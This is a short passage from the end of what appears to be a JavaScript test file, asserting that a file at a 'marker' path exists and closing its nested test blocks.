      expect(fs.existsSync(marker)).toBe(true);
    });
  });
});
